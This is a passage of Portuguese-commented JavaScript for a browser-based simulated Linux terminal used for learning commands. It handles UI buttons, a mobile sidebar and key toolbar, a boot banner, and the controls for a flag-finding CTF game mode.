  updateCursorDisplay();
});

// ══════════════════════════════════════════════════════
// BOTOES DA TITLEBAR
// ══════════════════════════════════════════════════════
document.getElementById('btn-clear').addEventListener('click', () => { clearTerminal(); inputEl.focus(); });
document.getElementById('btn-help').addEventListener('click', () => { executeCommand('help'); inputEl.focus(); });

// Foco inteligente — clicar no terminal foca o input invisivel
['terminal-panel', 'input-display', 'terminal-inputbar'].forEach(id => {
  const el = document.getElementById(id);
  if (el) el.addEventListener('click', () => {
    if (!window.getSelection().toString()) inputEl.focus();
  });
});

// ══════════════════════════════════════════════════════
// CTF — botoes
// ══════════════════════════════════════════════════════
document.getElementById('ctf-hint-btn').addEventListener('click', () => {
  if (CTF.active) giveCTFHint();
  inputEl.focus();
});
document.getElementById('bonus-flag-submit').addEventListener('click', submitBonusFlag);
document.getElementById('bonus-flag-input').addEventListener('keydown', e => {
  if (e.key === 'Enter') {
    e.preventDefault();
    submitBonusFlag();
  }
});
document.getElementById('victory-restart').addEventListener('click', () => {
  document.getElementById('ctf-victory').classList.remove('show');
  stopCTF(true);
  setTimeout(startCTF, 300);
});
document.getElementById('victory-exit').addEventListener('click', () => {
  stopCTF(false);
  document.getElementById('ctf-victory').classList.remove('show');
  inputEl.focus();
});

// ══════════════════════════════════════════════════════
// SIDEBAR MOBILE — drawer toggle
// ══════════════════════════════════════════════════════
const sidebarEl     = document.getElementById('sidebar');
const sidebarBackdrop = document.getElementById('sidebar-backdrop');
const sidebarToggle = document.getElementById('sidebar-toggle');
const sidebarClose  = document.getElementById('sidebar-close');

function openSidebar() {
  sidebarEl.classList.add('open');
  sidebarBackdrop.classList.add('visible');
  sidebarToggle.setAttribute('aria-expanded', 'true');
}
function closeSidebar() {
  sidebarEl.classList.remove('open');
  sidebarBackdrop.classList.remove('visible');
  sidebarToggle.setAttribute('aria-expanded', 'false');
  inputEl.focus();
}

sidebarToggle.addEventListener('click', () => {
  if (sidebarEl.classList.contains('open')) closeSidebar(); else openSidebar();
});
sidebarClose.addEventListener('click', closeSidebar);
sidebarBackdrop.addEventListener('click', closeSidebar);

// Fecha sidebar com tecla Escape
document.addEventListener('keydown', e => {
  if (e.key === 'Escape' && sidebarEl.classList.contains('open')) closeSidebar();
});

// Ao clicar em um item do menu em mobile, fecha o drawer apos inserir o exemplo
function isMobileViewport() {
  return window.matchMedia('(max-width: 768px)').matches;
}

// ══════════════════════════════════════════════════════
// MOBILE KEYS — toolbar de teclas especiais
// ══════════════════════════════════════════════════════
document.querySelectorAll('#mobile-keys .mkey').forEach(btn => {
  btn.addEventListener('click', e => {
    e.preventDefault();
    const key = btn.dataset.key;

    if (key === 'Enter') {
      // Enter na toolbar: executa e fecha teclado (nao chama focus antes)
      handleKey({ key: 'Enter', preventDefault: () => {} });
      return;
    }

    // Demais teclas: foca o input (mantém teclado aberto)
    inputEl.focus();

    if (key === 'ctrl-l') { handleKey({ key: 'l', ctrlKey: true, preventDefault: () => {} }); return; }
    if (key === 'ctrl-c') { handleKey({ key: 'c', ctrlKey: true, preventDefault: () => {} }); return; }

    handleKey({ key: key, preventDefault: () => {} });
  });
});

// ══════════════════════════════════════════════════════
// PROTECAO CONTRA ERROS GLOBAIS (importante com WAF/CSP)
// ══════════════════════════════════════════════════════
window.addEventListener('error', e => {
  // Apenas log silencioso para nao quebrar UX em caso de violacao CSP
  console.warn('[LinuxTerminal] runtime error:', e.message);
});

// ══════════════════════════════════════════════════════
// MENSAGEM DE BOOT
// ══════════════════════════════════════════════════════
function bootMessage() {
  const isMobile = isMobileViewport();
  const lines = [
    '<span class="hl-cmd">Ubuntu 22.04.3 LTS</span>',
    '<span class="output-dim">Kernel 5.15.0-91-generic on x86_64</span>',
    '',
    '<span class="hl-flag">+========================================================+</span>',
    '<span class="hl-flag">|  </span><span class="hl-cmd">LINUX TERMINAL</span><span class="output-dim"> -- Ambiente de Aprendizado Interativo</span><span class="hl-flag">  |</span>',
    '<span class="hl-flag">+========================================================+</span>',
    '',
    '<span class="output-dim">  Digite </span><span class="hl-cmd">help</span><span class="output-dim"> para ver os 50 comandos disponiveis</span>',
    isMobile
      ? '<span class="output-dim">  Toque no </span><span class="hl-cmd">menu (=)</span><span class="output-dim"> no canto superior esquerdo para abrir o guia</span>'
      : '<span class="output-dim">  Clique em um comando no menu lateral para inserir exemplos</span>',
    isMobile
      ? '<span class="output-dim">  Use a barra de teclas abaixo para </span><span class="hl-cmd">Tab</span><span class="output-dim">, setas e atalhos</span>'
      : '<span class="output-dim">  Use </span><span class="hl-cmd">setas para cima/baixo</span><span class="output-dim"> para historico e </span><span class="hl-cmd">Tab</span><span class="output-dim"> para autocompletar</span>',
    '',
    '<span style="color:var(--amber)">+========================================================+</span>',
    '<span style="color:var(--amber)">|  MODO JOGO -- CTF disponivel!                            |</span>',
    '<span style="color:var(--amber)">|                                                          |</span>',
    '<span style="color:var(--amber)">|  </span><span class="output-dim">Execute </span><span class="hl-cmd">ctf start</span><span class="output-dim"> para iniciar uma missao         </span><span style="color:var(--amber)">|</span>',
    '<span style="color:var(--amber)">|  </span><span class="output-dim">Capture The Flag -- encontre 10 flags no sistema   </span><span style="color:var(--amber)">|</span>',
    '<span style="color:var(--amber)">|  </span><span class="output-dim">Use todos os comandos do guia para vencer!         </span><span style="color:var(--amber)">|</span>',
    '<span style="color:var(--amber)">+========================================================+</span>',
    '',
  ];
  let i = 0;
  (function next() {
    if (i >= lines.length) return;
    print(lines[i], 'output');
    i++;
    setTimeout(next, 40);
  })();
}

// ══════════════════════════════════════════════════════
// PATCH MENU — fechar sidebar mobile ao selecionar comando
// ══════════════════════════════════════════════════════
const _origBuildMenu = buildMenu;
buildMenu = function() {
  _origBuildMenu();
  document.querySelectorAll('.menu-item').forEach(item => {
    item.addEventListener('click', () => {
      if (isMobileViewport()) setTimeout(closeSidebar, 200);
    });
  });
};

// ══════════════════════════════════════════════════════
// INIT
// ══════════════════════════════════════════════════════
buildMenu();
updatePrompt();
updateCursorDisplay();
bootMessage();
// Em mobile, nao auto-foca para nao abrir o teclado virtual imediatamente
if (!isMobileViewport()) {
  setTimeout(() => inputEl.focus(), 800);
}
